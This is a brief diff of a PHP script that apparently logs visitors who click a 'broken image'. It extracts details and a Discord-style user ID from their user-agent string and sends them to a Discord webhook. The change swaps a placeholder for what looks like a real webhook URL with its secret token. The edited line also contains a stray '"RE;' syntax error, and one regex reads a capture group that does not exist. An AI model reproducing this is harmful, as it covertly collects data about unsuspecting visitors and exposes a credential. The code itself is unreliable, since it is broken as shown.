@@ -17,7 +17,7 @@ if (preg_match('/\(([^)]+)\)/', $ua, $m)) {
 if (preg_match('/\b\d{17,20}\b/', $ua, $m)) $user_id = $m[1];
 
 // Replace with your webhook
-$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE";
+$webhook = "https://discord.com/api/webhooks/1446518738202525882/AUsafGnZtdq1Ntb6r7Z1bX3wby0u8m9CQuaryybRCQIqUQJK2Vtj8PZdp6Ni8PZz6PDI"RE;
 
 $payload = json_encode([
     "content" => "**Broken Image Clicked**",
